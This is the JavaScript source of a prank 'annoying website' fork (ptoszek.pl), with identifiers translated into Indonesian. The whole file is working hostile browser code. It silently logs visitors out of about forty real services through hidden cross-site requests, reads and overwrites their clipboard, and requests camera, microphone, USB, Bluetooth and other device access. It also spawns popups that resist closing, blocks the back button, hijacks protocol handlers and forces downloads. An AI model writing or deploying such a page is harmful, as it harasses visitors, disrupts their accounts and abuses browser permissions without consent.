/*
  ptoszek.pl
  Ditenagai oleh Jaczup

  Versi saya (ptoszek.pl): 
  - https://github.com/jaczup/ptoszek.pl
  Versi asli (theannoyingsite.com): 
  - https://github.com/feross/TheAnnoyingSite.com/

  Hubungi saya: https://jaczup.pl
  Server Discord resmi: https://dc.ptoszek.pl

  Kontributor:
    @jaczup - https://github.com/jaczup
    @intexpression - https://github.com/intexpression
    @dan64iel - https://github.com/dan64iel
    @imzeme - https://github.com/imzeme
    @GameShoot8050 - https://github.com/GameShoot8050
    @wetraks -  https://github.com/wetraks
    @cryblanka - https://github.com/cryblanka
    @9fm - https://github.com/9fm
    @MARECKIyt - https://github.com/MARECKIyt
    @Hyd3r1 - https://github.com/Hyd3r1
    @MariaWasNotAvailable - https://github.com/MariaWasNotAvailable
*/

// Konstanta layar dan jendela
const LEBAR_LAYAR = window.screen.availWidth
const TINGGI_LAYAR = window.screen.availHeight
const LEBAR_JENDELA = 480
const TINGGI_JENDELA = 260
const KECEPATAN = 15
const JARAK_TEPI = 10
const INTERVAL_GERAK = 50

const GAYA_TERSEMBUNYI = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

// Seni ASCII untuk alert
const SENI = [
  `
┊┊ ☆┊┊┊┊☆┊┊☆ ┊┊┊┊┊
┈┈┈┈╭━━━━━━╮┊☆ ┊┊
┈☆ ┈┈┃╳╳╳▕╲▂▂╱▏┊┊
┈┈☆ ┈┃╳╳╳▕▏▍▕▍▏┊┊
┈┈╰━┫╳╳╳▕▏╰┻╯▏┊┊
☆ ┈┈┈┃╳╳╳╳╲▂▂╱┊┊┊
┊┊☆┊╰┳┳━━┳┳╯┊ ┊ ☆┊
  `,
  `
░░▓▓░░░░░░░░▓▓░░
░▓▒▒▓░░░░░░▓▒▒▓░
░▓▒▒▒▓░░░░▓▒▒▒▓░
░▓▒▒▒▒▓▓▓▓▒▒▒▒▓░
░▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒░▓▒▒▒▒▒░▓▒▒▓
▓▒▒▒▓▓▒▒▒▓▒▓▓▒▒▓
▓▒░░▒▒▒▒▒▒▒▒▒░░▓
▓▒░░▒▓▒▒▓▒▒▓▒░░▓
░▓▒▒▒▓▓▓▓▓▓▓▒▒▓░
░░▓▒▒▒▒▒▒▒▒▒▒▓░░
░░░▓▓▓▓▓▓▓▓▓▓░░░
  `
]

// Daftar pencarian Google
const PENCARIAN = [
  'jshop',
  'ptoszek',
  'ptak',
  'kanarek',
  'jaczup'
]

// Daftar video
const VIDEO = [
  'media/videos/jaczup.mp4',
  'media/videos/duck.mp4',
  'media/videos/rickroll.mp4',
  'media/videos/golomb.mp4',
  'media/videos/mushbox.mp4',
  'media/videos/clearmax.mp4',
  'media/videos/freestrona.mp4',
  'media/videos/ajhsdfhjasdbhfjasdfs.mp4',
  'media/videos/v09044g40000cgr968jc77u1t2krb89g.mov',
  'media/videos/intro.mp4',
  'media/videos/szybkakaczka.mp4',
  'media/videos/kaczuszka.mp4',
  'media/videos/gratulacje.mp4',
  'media/videos/puddi.mp4'
]

// Daftar file yang akan diunduh
const UNDUHAN = [
  'media/images/ptok.jpg',
  'media/images/jaczup.jpg',
  'media/images/jaczupme.jpg',
  'media/images/ptoszek.jpg',
  'media/images/ptakwspodniach.jpg',
  'media/images/kichajacyptoszek.jpg',
  'media/images/lubieptoszki.png',
  'media/images/zimowyptoszek.jpeg',
  'media/images/zlyptok.jpeg',
  'media/images/grubyptok.jpg',
  'media/images/ptokzjajami.jpeg',
  'media/images/ptiszka.jpg',
]

// Frasa untuk text-to-speech
const FRASA = [
  'halo nama saya ptoszek, wkwk',
  'burung itu lucu lalalalalalalallalala',
  'apa kabar bro',
  'knuuurrr ledakan',
  'hee haw hee haw hee haw hee haw hee haw',
  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
]

// Daftar situs untuk logout massal
const SITUS_LOGOUT = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'],
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
  JShop: ['GET', 'https://jshop.partners/panel/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'],
  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'],
  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'],
  OLX: ['GET', 'https://www.olx.pl/account/logout'],
  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'],
  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'],
  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'],
  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'],
  Pinterest: ['GET', 'https://www.pinterest.com/logout/'],
  Reddit: ['GET', 'https://www.reddit.com/logout'],
  Spotify: ['GET', 'https://www.spotify.com/logout/'],
  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'],
  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'],
  Trello: ['GET', 'https://trello.com/logout'],
  Baidu: ['GET', 'https://passport.baidu.com/?logout'],
  VK: ['GET', 'https://vk.com/exit'],
  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'],
  Asana: ['POST', 'https://app.asana.com/app/asana/-/logout'],
}

/**
 * Array untuk menyimpan jendela anak yang dibuat.
 */
const jendelaAnak = []

/**
 * Jumlah interaksi
 */
let jumlahInteraksi = 0

// String spam super panjang
const stringPanjang = ulangiString(ulangiString('kamu kena ptoszek!!1 ',100),1500)

/**
 * Jumlah iframe yang disuntikkan untuk fungsi "super logout".
 */
let jumlahIframeLogout = 0

/**
 * Apakah jendela ini jendela anak?
 */
const apakahJendelaAnak = (window.opener && apakahIndukSamaOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

/**
 * Apakah jendela ini jendela induk?
 */
const apakahJendelaInduk = !apakahJendelaAnak

// Jalankan kode inisialisasi
inisialisasi()

if (apakahJendelaAnak) inisialisasiJendelaAnak()
else inisialisasiJendelaInduk()

/**
 * Inisialisasi untuk semua jendela
 */
function inisialisasi () {
  konfirmasiTutupHalaman()

  tangkapInputUser(event => {
    jumlahInteraksi += 1

    event.preventDefault()
    event.stopPropagation()

    if (event.which !== 0) bukaJendela()

    mulaiGetaran()
    aktifkanPictureInPicture()
    picuUnduhan()
    fokuskanJendela()
    salinSpamKeClipboard()
    bicara()
    mulaiTheramin()

    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      mintaAttestasiWebauthn()
      window.print()
      mintaAttestasiWebauthn()
      window.print()
      mintaAttestasiWebauthn()
    } else {
      mintaKunciPointer()

      if (!window.ApplePaySession) {
        mintaAttestasiWebauthn()
      }
      mintaBacaClipboard()
      mintaAksesMIDI()
      mintaAksesBluetooth()
      mintaAksesUSB()
      mintaAksesSerial()
      mintaAksesHID()
      mintaKameraDanMikrofon()
      mintaLayarPenuh()
    }
  })
}

/**
 * Inisialisasi untuk jendela anak
 */
function inisialisasiJendelaAnak () {
  daftarPenanganProtokol()
  sembunyikanKursor()
  gerakkanJendelaMemantul()
  mulaiVideo()
  deteksiTutupJendela()
  picuUnduhan()
  bicara()
  warnaPelangiTema()
  animasiUrlDenganEmoji()

  tangkapInputUser(event => {
    if (jumlahInteraksi === 1) {
      mulaiIntervalAlert()
    }
  })
}

/**
 * Inisialisasi untuk jendela induk
 */
function inisialisasiJendelaInduk () {
  tampilkanPesanHalo()
  blokirTombolKembali()
  isiRiwayat()
  mulaiVideoTersembunyi()

  tangkapInputUser(event => {
    if (jumlahInteraksi === 1) {
      daftarPenanganProtokol()
      cobaRekanJendelaRujukan()
      sembunyikanKursor()
      mulaiVideo()
      mulaiIntervalAlert()
      logoutSuper()
      hapusPesanHalo()
      warnaPelangiTema()
      animasiUrlDenganEmoji()
      bicara('Itu tadi salah')
    }
  })
}

/**
 * Coba alihkan jendela rujukan
 */
function cobaRekanJendelaRujukan () {
  if (apakahJendelaInduk && window.opener && !apakahIndukSamaOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

/**
 * Periksa apakah induk sama origin
 */
function apakahIndukSamaOrigin () {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

/**
 * Konfirmasi tutup halaman
 */
function konfirmasiTutupHalaman () {
  window.addEventListener('beforeunload', event => {
    bicara('Jangan pergi!')
    event.returnValue = true
  })
}

/**
 * Daftar penangan protokol
 */
function daftarPenanganProtokol () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const daftarProtokol = [
    'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto', 'mms',
    'news', 'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel', 'urn', 'webcal', 'wtai', 'xmpp'
  ]

  const urlPenangan = window.location.href + '/url=%s'

  daftarProtokol.forEach(proto => {
    navigator.registerProtocolHandler(proto, urlPenangan, 'Ptoszek')
  })
}

/**
 * Minta akses kamera dan mikrofon
 */
function mintaKameraDanMikrofon () {
  if (!navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(perangkat => {
    const kamera = perangkat.filter(device => device.kind === 'videoinput')

    if (kamera.length === 0) return
    const kameraUtama = kamera[kamera.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: kameraUtama.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { /* Tidak ada senter */ })
    }, () => { /* Abaikan error */ })
  })
}

/**
 * Animasi URL dengan emoji
 */
function animasiUrlDenganEmoji () {
  if (window.ApplePaySession) return

  const rand = Math.random()
  if (rand < 0.33) {
    animasiUrlDenganBayi()
  } else if (rand < 0.67) {
    animasiUrlDenganGelombang()
  } else {
    animasiUrlDenganBulan()
  }

  function animasiUrlDenganBayi () {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

    setInterval(() => {
      let s = ''
      for (let i = 0; i < 10; i++) {
        const m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }
      window.location.hash = s
    }, 100)
  }

  function animasiUrlDenganGelombang () {
    setInterval(() => {
      let s = ''
      for (let i = 0; i < 10; i++) {
        const n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4
        s += String.fromCharCode(0x2581 + n)
      }
      window.location.hash = s
    }, 100)
  }

  function animasiUrlDenganBulan () {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) x++
        if (x >= d.length) m = 1
        else d[x]++
      } else {
        while (d[x] === 0) x++
        if (x >= d.length) m = 0
        else {
          d[x]++
          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(n => { s += f[n] })
      window.location.hash = s
    }, 100)
  }
}

/**
 * Minta kunci pointer
 */
function mintaKunciPointer () {
  const requestPointerLockApi = (
    document.body.requestPointerLock ||
    document.body.webkitRequestPointerLock ||
    document.body.mozRequestPointerLock ||
    document.body.msRequestPointerLock
  )

  requestPointerLockApi.call(document.body)
}

/**
 * Mulai getaran
 */
function mulaiGetaran () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const durasi = Math.floor(Math.random() * 600)
    window.navigator.vibrate(durasi)
  }, 1000)

  window.addEventListener('gamepadconnected', (event) => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          })
        }
      }, 1000)
    }
  })
}

/**
 * Tangkap input user
 */
function tangkapInputUser (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })
  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)
  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

/**
 * Mulai video tersembunyi untuk Picture-in-Picture
 */
function mulaiVideoTersembunyi () {
  const video = document.createElement('video')
  video.src = ambilAcak(VIDEO)
  video.loop = true
  video.muted = true
  video.style = GAYA_TERSEMBUNYI
  video.autoplay = true
  video.play()

  document.body.appendChild(video)
}

/**
 * Aktifkan Picture-in-Picture
 */
function aktifkanPictureInPicture () {
  const video = document.querySelector('video')
  if (document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture()
    video.play()
  }
}

/**
 * Fokuskan semua jendela anak
 */
function fokuskanJendela () {
  jendelaAnak.forEach(win => {
    if (!win.closed) win.focus()
  })
}

/**
 * Buka jendela baru
 */
function bukaJendela () {
  const { x, y } = dapatkanKoordinatAcak()
  const opts = `width=${LEBAR_JENDELA},height=${TINGGI_JENDELA},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  if (!win) return
  jendelaAnak.push(win)

  if (jendelaAnak.length === 2) aturJendelaPencarian(win)

  win.onunload = function () { return false }
  win.addEventListener("beforeunload", function (e) {
    e.preventDefault()
    e.returnValue = ""
  })
  win.onbeforeunload = function () { return "" }
}

/**
 * Sembunyikan kursor
 */
function sembunyikanKursor () {
  document.querySelector('html').style = 'cursor: none;'
}

/**
 * Picu unduhan
 */
function picuUnduhan () {
  const namaFile = ambilAcak(UNDUHAN)
  const a = document.createElement('a')
  a.href = namaFile
  a.download = namaFile
  a.click()
}

/**
 * Bicara pake text-to-speech
 */
function bicara (frasa) {
  if (frasa == null) frasa = ambilAcak(FRASA)
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(frasa))
}

/**
 * Mulai Theramin (suara aneh)
 */
function mulaiTheramin () {
  const konteksAudio = new AudioContext()
  const osilator = konteksAudio.createOscillator()
  const penguat = konteksAudio.createGain()

  const dasarNada = 50
  const rentangNada = 4000

  const gelombang = konteksAudio.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  osilator.setPeriodicWave(gelombang)
  osilator.connect(penguat)
  penguat.connect(konteksAudio.destination)
  osilator.start(0)

  const osilatorSuara = ({ nada, volume }) => {
    osilator.frequency.value = dasarNada + nada * rentangNada
    penguat.gain.value = volume * 3
  }

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const nada = (clientX - clientWidth / 2) / clientWidth
    const volume = (clientY - clientHeight / 2) / clientHeight
    osilatorSuara({ nada, volume })
  })
}

/**
 * Minta baca clipboard
 */
function mintaBacaClipboard () {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          window.alert("Berhasil membaca clipboard: '" + data + "'")
        }
      },
      () => {}
    )
  } catch {}
}

/**
 * Minta attestasi Webauthn
 */
function mintaAttestasiWebauthn () {
  try {
    const createCredentialDefaultArgs = {
      publicKey: {
        rp: { name: 'Acme' },
        user: {
          id: new Uint8Array(16),
          name: 'lolica@jaczup.me',
          displayName: 'Ptoszek Jaczupa'
        },
        pubKeyCredParams: [{ type: 'public-key', alg: -7 }],
        attestation: 'direct',
        timeout: 60000,
        challenge: new Uint8Array([
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        challenge: new Uint8Array([
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      })
  } catch {}
}

/**
 * Minta akses MIDI
 */
function mintaAksesMIDI () {
  try {
    navigator.requestMIDIAccess({ sysex: true })
  } catch {}
}

/**
 * Minta akses Bluetooth
 */
function mintaAksesBluetooth () {
  try {
    navigator.bluetooth.requestDevice({ acceptAllDevices: true })
      .then(device => device.gatt.connect())
  } catch {}
}

/**
 * Minta akses USB
 */
function mintaAksesUSB () {
  try {
    navigator.usb.requestDevice({ filters: [{}] })
  } catch {}
}

/**
 * Minta akses Serial
 */
function mintaAksesSerial () {
  try {
    navigator.serial.requestPort({ filters: [] })
  } catch {}
}

/**
 * Minta akses HID
 */
function mintaAksesHID () {
  try {
    navigator.hid.requestDevice({ filters: [] })
  } catch {}
}

/**
 * Gerakkan jendela memantul
 */
function gerakkanJendelaMemantul () {
  let vx = KECEPATAN * (Math.random() > 0.5 ? 1 : -1)
  let vy = KECEPATAN * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < JARAK_TEPI) vx = Math.abs(vx)
    if (x + width > LEBAR_LAYAR - JARAK_TEPI) vx = -1 * Math.abs(vx)
    if (y < JARAK_TEPI + 20) vy = Math.abs(vy)
    if (y + height > TINGGI_LAYAR - JARAK_TEPI) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, INTERVAL_GERAK)
}

/**
 * Mulai video
 */
function mulaiVideo () {
  const video = document.createElement('video')
  video.src = ambilAcak(VIDEO)
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%;'
  document.body.appendChild(video)
}

/**
 * Deteksi tutup jendela
 */
function deteksiTutupJendela () {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.tutupJendela(window)
  })
}

/**
 * Tangani tutup jendela
 */
function tutupJendela (win) {
  const i = jendelaAnak.indexOf(win)
  if (i >= 0) jendelaAnak.splice(i, 1)
}

/**
 * Tampilkan pesan halo
 */
function tampilkanPesanHalo () {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

/**
 * Hapus pesan halo
 */
function hapusPesanHalo () {
  const pesanHalo = document.querySelector('.hello-message')
  pesanHalo.remove()
}

/**
 * Ubah warna tema
 */
function warnaPelangiTema () {
  function isiNol (width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta.theme-color')
  setInterval(() => {
    meta.setAttribute('content', '#' + isiNol(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}

/**
 * Ulangi string
 */
function ulangiString(string, kali) {
  var hasil = ""
  while (kali > 0) {
    hasil += string
    kali--
  }
  return hasil
}

/**
 * Salin spam ke clipboard
 */
function salinSpamKeClipboard () {
  salinClipboard(stringPanjang)
}

/**
 * Salin ke clipboard
 */
function salinClipboard (teks) {
  const span = document.createElement('span')
  span.textContent = teks
  span.style.whiteSpace = 'pre'

  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  let win = iframe.contentWindow
  win.document.body.appendChild(span)

  let selection = win.getSelection()

  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  let sukses = false
  try {
    sukses = win.document.execCommand('copy')
  } catch (err) {
    console.log(err)
  }

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return sukses
}

/**
 * Mulai interval alert
 */
function mulaiIntervalAlert () {
  setInterval(() => {
    if (Math.random() < 0.5) {
      tampilkanAlert()
    } else {
      window.print()
    }
  }, 30000)
}

/**
 * Tampilkan alert
 */
function tampilkanAlert () {
  const seniAcak = ambilAcak(SENI)
  const teksAlertPanjang = Array(200).join(seniAcak)
  window.alert(teksAlertPanjang)
}

/**
 * Minta layar penuh
 */
function mintaLayarPenuh () {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}

/**
 * Logout super (logout dari semua situs)
 */
function logoutSuper () {
  function bersihkan (el, tunda) {
    if (tunda) { tunda = false; return }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => bersihkan(img)
    img.onerror = () => bersihkan(img)
    img.style = GAYA_TERSEMBUNYI
    document.body.appendChild(img)
    img.src = url
  }

  function post (url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = GAYA_TERSEMBUNYI
    iframe.name = 'iframe' + jumlahIframeLogout
    document.body.appendChild(iframe)

    jumlahIframeLogout += 1

    const form = document.createElement('form')
    form.style = GAYA_TERSEMBUNYI

    let jumlahMuat = 0
    iframe.onload = iframe.onerror = () => {
      if (jumlahMuat >= 1) bersihkan(iframe)
      jumlahMuat += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }

  for (const nama in SITUS_LOGOUT) {
    const metode = SITUS_LOGOUT[nama][0]
    const url = SITUS_LOGOUT[nama][1]
    const params = SITUS_LOGOUT[nama][2] || {}

    if (metode === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `Logout dari ${nama}...`

    const pesanLogout = document.querySelector('.logout-messages')
    pesanLogout.appendChild(div)
  }
}

/**
 * Blokir tombol kembali
 */
function blokirTombolKembali () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

/**
 * Isi riwayat
 */
function isiRiwayat () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  window.history.pushState({}, '', window.location.pathname)
}

/**
 * Dapatkan koordinat acak
 */
function dapatkanKoordinatAcak () {
  const x = JARAK_TEPI + Math.floor(Math.random() * (LEBAR_LAYAR - LEBAR_JENDELA - JARAK_TEPI))
  const y = JARAK_TEPI + Math.floor(Math.random() * (TINGGI_LAYAR - TINGGI_JENDELA - JARAK_TEPI))
  return { x, y }
}

/**
 * Ambil elemen acak dari array
 */
function ambilAcak (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

/**
 * Atur jendela pencarian Google
 */
function aturJendelaPencarian (win) {
  if (!win) return
  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(PENCARIAN[0])
  let indeksPencarian = 1
  const interval = setInterval(() => {
    if (indeksPencarian >= PENCARIAN.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      tutupJendela(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = dapatkanKoordinatAcak()
      win.moveTo(x, y)
      win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(PENCARIAN[indeksPencarian])
      indeksPencarian += 1
    }, 500)
  }, 2500)
  }
